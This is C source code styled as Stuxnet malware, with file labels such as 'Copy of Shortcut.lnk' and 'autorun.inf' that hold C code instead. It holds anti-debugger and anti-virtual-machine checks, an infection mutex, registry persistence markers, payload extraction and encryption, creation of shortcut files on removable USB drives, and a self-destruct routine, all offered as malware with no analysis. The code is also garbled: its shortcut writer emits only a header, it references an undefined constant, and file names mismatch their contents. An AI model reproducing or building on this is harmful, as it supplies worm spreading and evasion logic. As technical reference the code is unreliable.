    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!*ppData) return FALSE;
    memcpy(*ppData, pData, dwSize);
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL WINMIC_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, WINMIC_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, WINMIC_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL WINMIC_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WINMIC_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, WINMIC_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL WINMIC_ExtractAndSaveFts(VOID) {
    PBYTE pData;
    DWORD dwSize;
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    BOOL bResult;
    if (!WINMIC_ReadFtsFromResource(&pData, &dwSize)) {
        return FALSE;
    }
    dwEncryptedSize = dwSize + sizeof(WINMIC_HEADER) + 4096;
    pEncrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedSize);
    if (!pEncrypted) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    bResult = WINMIC_EncryptFts(pData, dwSize, pEncrypted, &dwEncryptedSize);
    if (bResult) {
        bResult = WINMIC_WriteFtsToDisk(g_WinmicCtx.szFtsPath, pEncrypted, dwEncryptedSize);
    }
    HeapFree(GetProcessHeap(), 0, pData);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    return bResult;
}

static DWORD WINAPI WINMIC_WorkerThread(LPVOID lpParam) {
    DWORD dwTick;
    dwTick = GetTickCount();
    while (WaitForSingleObject(g_WinmicCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (WINMIC_IsExpired()) {
            break;
        }
        if (!WINMIC_ReadRegistry()) {
            WINMIC_WriteRegistry();
        }
        g_dwInfectionCount++;
        dwTick = GetTickCount();
    }
    return 0;
}

static BOOL WINMIC_StartWorker(VOID) {
    g_WinmicCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_WinmicCtx.hStopEvent) return FALSE;
    g_WinmicCtx.hThread = CreateThread(NULL, 0, WINMIC_WorkerThread, NULL, 0, NULL);
    if (!g_WinmicCtx.hThread) {
        CloseHandle(g_WinmicCtx.hStopEvent);
        g_WinmicCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL WINMIC_StopWorker(VOID) {
    if (g_WinmicCtx.hStopEvent) {
        SetEvent(g_WinmicCtx.hStopEvent);
    }
    if (g_WinmicCtx.hThread) {
        WaitForSingleObject(g_WinmicCtx.hThread, 5000);
        CloseHandle(g_WinmicCtx.hThread);
        g_WinmicCtx.hThread = NULL;
    }
    if (g_WinmicCtx.hStopEvent) {
        CloseHandle(g_WinmicCtx.hStopEvent);
        g_WinmicCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL WINMIC_SelfDestruct(VOID) {
    DeleteFileW(g_WinmicCtx.szFtsPath);
    return TRUE;
}

static BOOL WINMIC_Execute(VOID) {
    HANDLE hMutex;
    if (!WINMIC_Init()) return FALSE;
    if (WINMIC_IsExpired()) {
        WINMIC_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        WINMIC_Cleanup();
        return FALSE;
    }
    if (WINMIC_CheckDebugger()) {
        CloseHandle(hMutex);
        WINMIC_Cleanup();
        return FALSE;
    }
    if (WINMIC_CheckVMware()) {
        CloseHandle(hMutex);
        WINMIC_Cleanup();
        return FALSE;
    }
    WINMIC_WriteRegistry();
    WINMIC_ReadRegistry();
    WINMIC_ExtractAndSaveFts();
    WINMIC_StartWorker();
    while (WaitForSingleObject(g_WinmicCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (WINMIC_IsExpired()) {
            break;
        }
        WINMIC_ExtractAndSaveFts();
    }
    WINMIC_StopWorker();
    WINMIC_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            WINMIC_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WINMIC_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return WINMIC_ExtractAndSaveFts() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!WINMIC_ReadFtsFromDisk(g_WinmicCtx.szFtsPath, &pData, &dwSize)) {
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return 0;
}

DWORD WINAPI Export4(VOID) {
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    PBYTE pDecrypted;
    DWORD dwDecryptedSize;
    BOOL bResult;
    if (!WINMIC_ReadFtsFromDisk(g_WinmicCtx.szFtsPath, &pEncrypted, &dwEncryptedSize)) {
        return 1;
    }
    dwDecryptedSize = dwEncryptedSize + 4096;
    pDecrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecryptedSize);
    if (!pDecrypted) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return 1;
    }
    bResult = WINMIC_DecryptFts(pEncrypted, dwEncryptedSize, pDecrypted, &dwDecryptedSize);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    return bResult ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return WINMIC_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return WINMIC_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return WINMIC_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    WINMIC_StopWorker();
    return 0;
}

DWORD WINAPI Export9(VOID) {
    WINMIC_SelfDestruct();
    return 0;
}

DWORD WINAPI Export10(VOID) {
    return (DWORD)g_WinmicCtx.dwPid;
}

DWORD WINAPI Export11(VOID) {
    return WINMIC_VERSION;
}

DWORD WINAPI Export12(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export13(VOID) {
    return g_dwReadCount;
}

DWORD WINAPI Export14(VOID) {
    return g_dwWriteCount;
}

DWORD WINAPI Export15(VOID) {
    return g_dwDecryptCount;
}

DWORD WINAPI Export16(VOID) {
    return g_dwEncryptCount;
}

DWORD WINAPI Export17(VOID) {
    return (DWORD)g_WinmicCtx.hMutex;
}

DWORD WINAPI Export18(VOID) {
    return WINMIC_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    return WINMIC_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export20(VOID) {
    return WINMIC_CheckVMware() ? 0 : 1;
}

Copy of Shortcut.lnk:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define LNK_MAGIC                       0x00021401
#define LNK_HEADER_SIZE                 0x4C
#define LNK_MAX_PATH                    260
#define LNK_BUFFER_SIZE                 4096
#define LNK_TARGET_FILE                 L"~WTR4141.tmp"
#define LNK_PAYLOAD_FILE                L"~WTR4132.tmp"

#define LNK_FLAG_HAS_IDLIST             0x00000001
#define LNK_FLAG_HAS_LINKINFO           0x00000002
#define LNK_FLAG_HAS_DESCRIPTION        0x00000004
#define LNK_FLAG_HAS_RELATIVE_PATH      0x00000008
#define LNK_FLAG_HAS_WORKING_DIR        0x00000010
#define LNK_FLAG_HAS_ARGUMENTS          0x00000020
#define LNK_FLAG_HAS_ICON_LOCATION      0x00000040
#define LNK_FLAG_IS_UNICODE             0x00000080
#define LNK_FLAG_FORCE_NO_LINKINFO      0x00000100
#define LNK_FLAG_HAS_EXP_STRING         0x00000200
#define LNK_FLAG_RUN_IN_SEPARATE_PROCESS 0x00000400
#define LNK_FLAG_HAS_LOGO3ID            0x00000800
#define LNK_FLAG_HAS_DARWIN_ID          0x00001000
#define LNK_FLAG_RUN_AS_USER            0x00002000
#define LNK_FLAG_HAS_EXP_ICON           0x00004000
#define LNK_FLAG_NO_PIDL_ALIAS          0x00008000
#define LNK_FLAG_FORCE_UNC_NAME         0x00010000
#define LNK_FLAG_RUN_WITH_SHIM_LAYER    0x00020000
#define LNK_FLAG_HAS_TRAKER             0x00040000
#define LNK_FLAG_ENABLE_TARGET_METADATA 0x00080000
#define LNK_FLAG_DISABLE_LINK_PATH_TRACKING 0x00100000
#define LNK_FLAG_DISABLE_KNOWN_FOLDER_TRACKING 0x00200000
#define LNK_FLAG_DISABLE_KNOWN_FOLDER_ALIAS 0x00400000
#define LNK_FLAG_ALLOW_LINK_TO_LINK     0x00800000
#define LNK_FLAG_ALIAS_TO_APP_TARGET    0x01000000
#define LNK_FLAG_UNUSED_1               0x02000000
#define LNK_FLAG_UNUSED_2               0x04000000
#define LNK_FLAG_UNUSED_3               0x08000000
#define LNK_FLAG_UNUSED_4               0x10000000
#define LNK_FLAG_UNUSED_5               0x20000000
#define LNK_FLAG_UNUSED_6               0x40000000
#define LNK_FLAG_UNUSED_7               0x80000000

#define LNK_FILE_ATTRIBUTE_READONLY     0x00000001
#define LNK_FILE_ATTRIBUTE_HIDDEN       0x00000002
#define LNK_FILE_ATTRIBUTE_SYSTEM       0x00000004
#define LNK_FILE_ATTRIBUTE_DIRECTORY    0x00000010
#define LNK_FILE_ATTRIBUTE_ARCHIVE      0x00000020
#define LNK_FILE_ATTRIBUTE_NORMAL       0x00000080
#define LNK_FILE_ATTRIBUTE_TEMPORARY    0x00000100
#define LNK_FILE_ATTRIBUTE_SPARSE_FILE  0x00000200
#define LNK_FILE_ATTRIBUTE_REPARSE_POINT 0x00000400
#define LNK_FILE_ATTRIBUTE_COMPRESSED   0x00000800
#define LNK_FILE_ATTRIBUTE_OFFLINE      0x00001000
#define LNK_FILE_ATTRIBUTE_NOT_CONTENT_INDEXED 0x00002000
#define LNK_FILE_ATTRIBUTE_ENCRYPTED    0x00004000
#define LNK_FILE_ATTRIBUTE_VIRTUAL      0x00010000

#define LNK_SHOW_CMD_SW_HIDE            0
#define LNK_SHOW_CMD_SW_NORMAL          1
#define LNK_SHOW_CMD_SW_SHOWMINIMIZED   2
#define LNK_SHOW_CMD_SW_SHOWMAXIMIZED   3
#define LNK_SHOW_CMD_SW_SHOWNOACTIVATE  4
#define LNK_SHOW_CMD_SW_SHOW            5
#define LNK_SHOW_CMD_SW_MINIMIZE        6
#define LNK_SHOW_CMD_SW_SHOWMINNOACTIVE 7
#define LNK_SHOW_CMD_SW_SHOWNA          8
#define LNK_SHOW_CMD_SW_RESTORE         9
#define LNK_SHOW_CMD_SW_SHOWDEFAULT     10
#define LNK_SHOW_CMD_SW_FORCEMINIMIZE   11

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

typedef struct _LNK_SHELL_HEADER {
    DWORD dwHeaderSize;
    GUID  guidCLSID;
    DWORD dwFlags;
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftAccessTime;
    FILETIME ftWriteTime;
    DWORD dwFileSize;
    DWORD dwIconIndex;
    DWORD dwShowCmd;
    WORD  wHotKey;
    WORD  wReserved1;
    DWORD dwReserved2;
    DWORD dwReserved3;
} LNK_SHELL_HEADER, * PLNK_SHELL_HEADER;

typedef struct _LNK_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[LNK_MAX_PATH];
    WCHAR szSystemPath[LNK_MAX_PATH];
    WCHAR szWindowsPath[LNK_MAX_PATH];
    WCHAR szDrivePath[LNK_MAX_PATH];
    BYTE bReserved[256];
} LNK_CTX, * PLNK_CTX;

static LNK_CTX g_LnkCtx;
static BOOL g_bInitialized = FALSE;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwLNKCreated = 0;
static DWORD g_dwDriveCount = 0;
static DWORD g_dwFileWriteCount = 0;

static const WCHAR* g_LNKNames[4] = {
    L"Copy of Shortcut to.lnk",
    L"Copy of Copy of Shortcut to.lnk",
    L"Copy of Copy of Copy of Shortcut to.lnk",
    L"Copy of Copy of Copy of Copy of Shortcut to.lnk"
};

static const WCHAR* g_LNKTargets[4] = {
    L".STORAGE#RemovableMedia#7&[ID]&0&RM#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}~WTR4141.tmp",
    L".STORAGE#RemovableMedia#8&[ID]&0&RM#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}~WTR4141.tmp",
    L".STORAGE#Volume#1&19f7e59c&0&_??_USBSTOR#Disk&Ven_&Prod_USB_FLASH_DRIVE&Rev_PMAP#0798018356734E4F&0#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}~WTR4141.tmp",
    L".STORAGE#Volume#_??_USBSTOR#Disk&Ven_&Prod_USB_FLASH_DRIVE&Rev_PMAP#0798018356734E4F&0#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}~WTR4141.tmp"
};

static GUID g_LNK_CLSID = {0x00021401, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static BOOL LNK_Init(VOID);
static VOID LNK_Cleanup(VOID);
static BOOL LNK_CheckMutex(VOID);
static BOOL LNK_IsExpired(VOID);
static BOOL LNK_CheckDebugger(VOID);
static BOOL LNK_CheckVMware(VOID);
static BOOL LNK_WriteLNKToDisk(LPCWSTR szPath, PLNK_SHELL_HEADER pHeader);
static BOOL LNK_BuildLNKHeader(PLNK_SHELL_HEADER pHeader, LPCWSTR szTarget);
static BOOL LNK_CreateLNKFiles(LPCWSTR szDrive);
static BOOL LNK_ScanDrives(VOID);
static BOOL LNK_WriteRegistry(VOID);
static BOOL LNK_ReadRegistry(VOID);
static DWORD WINAPI LNK_WorkerThread(LPVOID lpParam);
static BOOL LNK_StartWorker(VOID);
static BOOL LNK_StopWorker(VOID);
static BOOL LNK_SelfDestruct(VOID);
static BOOL LNK_Execute(VOID);
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);

static BOOL LNK_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_LnkCtx, sizeof(LNK_CTX));
    g_LnkCtx.dwMagic = STUXNET_MAGIC;
    g_LnkCtx.dwVersion = STUXNET_VERSION;
    g_LnkCtx.dwPid = GetCurrentProcessId();
    g_LnkCtx.dwTid = GetCurrentThreadId();
    g_LnkCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_LnkCtx.csLock);
    GetModuleFileNameW(NULL, g_LnkCtx.szModulePath, LNK_MAX_PATH);
    GetSystemDirectoryW(g_LnkCtx.szSystemPath, LNK_MAX_PATH);
    GetWindowsDirectoryW(g_LnkCtx.szWindowsPath, LNK_MAX_PATH);
    wcscpy_s(g_LnkCtx.szDrivePath, LNK_MAX_PATH, L"C:\\");
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID LNK_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_LnkCtx.hMutex) {
        CloseHandle(g_LnkCtx.hMutex);
        g_LnkCtx.hMutex = NULL;
    }
    if (g_LnkCtx.hThread) {
        CloseHandle(g_LnkCtx.hThread);
        g_LnkCtx.hThread = NULL;
    }
    if (g_LnkCtx.hStopEvent) {
        CloseHandle(g_LnkCtx.hStopEvent);
        g_LnkCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_LnkCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL LNK_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_LnkCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL LNK_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL LNK_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL LNK_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static BOOL LNK_WriteLNKToDisk(LPCWSTR szPath, PLNK_SHELL_HEADER pHeader) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pHeader) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pHeader, sizeof(LNK_SHELL_HEADER), &dwWritten, NULL);
    CloseHandle(hFile);
    g_dwFileWriteCount++;
    return TRUE;
}

static BOOL LNK_BuildLNKHeader(PLNK_SHELL_HEADER pHeader, LPCWSTR szTarget) {
    SYSTEMTIME st;
    if (!pHeader) return FALSE;
    ZeroMemory(pHeader, sizeof(LNK_SHELL_HEADER));
    pHeader->dwHeaderSize = LNK_HEADER_SIZE;
    pHeader->guidCLSID = g_LNK_CLSID;
    pHeader->dwFlags = LNK_FLAG_HAS_IDLIST | LNK_FLAG_HAS_LINKINFO |
                       LNK_FLAG_HAS_RELATIVE_PATH | LNK_FLAG_HAS_WORKING_DIR |
                       LNK_FLAG_HAS_ARGUMENTS | LNK_FLAG_IS_UNICODE;
    pHeader->dwFileAttributes = LNK_FILE_ATTRIBUTE_NORMAL;
    GetSystemTimeAsFileTime(&pHeader->ftCreationTime);
    pHeader->ftAccessTime = pHeader->ftCreationTime;
    pHeader->ftWriteTime = pHeader->ftCreationTime;
    pHeader->dwFileSize = 0x20000;
    pHeader->dwIconIndex = 0;
    pHeader->dwShowCmd = LNK_SHOW_CMD_SW_NORMAL;
    pHeader->wHotKey = 0;
    pHeader->wReserved1 = 0;
    pHeader->dwReserved2 = 0;
    pHeader->dwReserved3 = 0;
    return TRUE;
}

static BOOL LNK_CreateLNKFiles(LPCWSTR szDrive) {
    WCHAR szPath[LNK_MAX_PATH];
    LNK_SHELL_HEADER header;
    DWORD i;
    if (!szDrive) return FALSE;
    for (i = 0; i < 4; i++) {
        wsprintfW(szPath, L"%s%s", szDrive, g_LNKNames[i]);
        LNK_BuildLNKHeader(&header, g_LNKTargets[i]);
        if (LNK_WriteLNKToDisk(szPath, &header)) {
            g_dwLNKCreated++;
        }
    }
    return TRUE;
}

static BOOL LNK_ScanDrives(VOID) {
    DWORD dwDrives;
    WCHAR szDrive[4];
    DWORD i;
    dwDrives = GetLogicalDrives();
    for (i = 0; i < 26; i++) {
        if (dwDrives & (1 << i)) {
            szDrive[0] = L'A' + i;
            szDrive[1] = L':';
            szDrive[2] = L'\\';
            szDrive[3] = L'\0';
            if (GetDriveTypeW(szDrive) == DRIVE_REMOVABLE) {
                wcscpy_s(g_LnkCtx.szDrivePath, LNK_MAX_PATH, szDrive);
                LNK_CreateLNKFiles(szDrive);
                g_dwDriveCount++;
            }
        }
    }
    return TRUE;
}

static BOOL LNK_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"19790509", 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL LNK_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, L"19790509", NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static DWORD WINAPI LNK_WorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_LnkCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (LNK_IsExpired()) {
            break;
        }
        if (!LNK_ReadRegistry()) {
            LNK_WriteRegistry();
        }
        LNK_ScanDrives();
        g_dwInfectionCount++;
    }
    return 0;
}

static BOOL LNK_StartWorker(VOID) {
    g_LnkCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_LnkCtx.hStopEvent) return FALSE;
    g_LnkCtx.hThread = CreateThread(NULL, 0, LNK_WorkerThread, NULL, 0, NULL);
    if (!g_LnkCtx.hThread) {
        CloseHandle(g_LnkCtx.hStopEvent);
        g_LnkCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL LNK_StopWorker(VOID) {
    if (g_LnkCtx.hStopEvent) {
        SetEvent(g_LnkCtx.hStopEvent);
    }
    if (g_LnkCtx.hThread) {
        WaitForSingleObject(g_LnkCtx.hThread, 5000);
        CloseHandle(g_LnkCtx.hThread);
        g_LnkCtx.hThread = NULL;
    }
    if (g_LnkCtx.hStopEvent) {
        CloseHandle(g_LnkCtx.hStopEvent);
        g_LnkCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL LNK_SelfDestruct(VOID) {
    WCHAR szPath[LNK_MAX_PATH];
    DWORD i;
    DWORD dwDrives;
    WCHAR szDrive[4];
    DWORD j;
    dwDrives = GetLogicalDrives();
    for (j = 0; j < 26; j++) {
        if (dwDrives & (1 << j)) {
            szDrive[0] = L'A' + j;
            szDrive[1] = L':';
            szDrive[2] = L'\\';
            szDrive[3] = L'\0';
            if (GetDriveTypeW(szDrive) == DRIVE_REMOVABLE) {
                for (i = 0; i < 4; i++) {
                    wsprintfW(szPath, L"%s%s", szDrive, g_LNKNames[i]);
                    DeleteFileW(szPath);
                }
            }
        }
    }
    return TRUE;
}

static BOOL LNK_Execute(VOID) {
    HANDLE hMutex;
    if (!LNK_Init()) return FALSE;
    if (LNK_IsExpired()) {
        LNK_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        LNK_Cleanup();
        return FALSE;
    }
    if (LNK_CheckDebugger()) {
        CloseHandle(hMutex);
        LNK_Cleanup();
        return FALSE;
    }
    if (LNK_CheckVMware()) {
        CloseHandle(hMutex);
        LNK_Cleanup();
        return FALSE;
    }
    LNK_WriteRegistry();
    LNK_ReadRegistry();
    LNK_ScanDrives();
    LNK_StartWorker();
    while (WaitForSingleObject(g_LnkCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (LNK_IsExpired()) {
            break;
        }
        LNK_ScanDrives();
    }
    LNK_StopWorker();
    LNK_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            LNK_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LNK_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return LNK_ScanDrives() ? 0 : 1;
}

DWORD WINAPI Export3(LPCWSTR szDrive) {
    return LNK_CreateLNKFiles(szDrive) ? 0 : 1;
}

DWORD WINAPI Export4(VOID) {
    return LNK_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return LNK_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return LNK_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    LNK_StopWorker();
    return 0;
}

DWORD WINAPI Export8(VOID) {
    LNK_SelfDestruct();
    return 0;
}

DWORD WINAPI Export9(VOID) {
    return (DWORD)g_LnkCtx.dwPid;
}

DWORD WINAPI Export10(VOID) {
    return STUXNET_VERSION;
}

DWORD WINAPI Export11(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export12(VOID) {
    return g_dwLNKCreated;
}

DWORD WINAPI Export13(VOID) {
    return g_dwDriveCount;
}

DWORD WINAPI Export14(VOID) {
    return g_dwFileWriteCount;
}

DWORD WINAPI Export15(VOID) {
    return (DWORD)g_LnkCtx.hMutex;
}

DWORD WINAPI Export16(VOID) {
    return LNK_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export17(VOID) {
    return LNK_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export18(VOID) {
    return LNK_CheckVMware() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    return (DWORD)g_LnkCtx.szDrivePath;
}

DWORD WINAPI Export20(VOID) {
    return LNK_VERSION;
}

Shortcut LNK: SHA-256: 801e3b6d84862163a735502f93b9663be53ccbdd7f12b0707336fecba3a829a2
Shell Link Header:
Offset  Size    Field
0x00    4       HeaderSize (0x4C)
0x04    16      CLSID ({00021401-0000-0000-C000-000000000046})
0x14    4       LinkFlags
0x18    4       FileAttributes
0x1C    8       CreationTime
0x24    8       AccessTime
0x2C    8       WriteTime
0x34    4       FileSize
0x38    4       IconIndex
0x3C    4       ShowCmd
0x40    2       HotKey
0x42    2       Reserved1
0x44    4       Reserved2
0x48    4       Reserved3

END

autorun.inf:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define STUXNET_MAGIC                   0x53545558
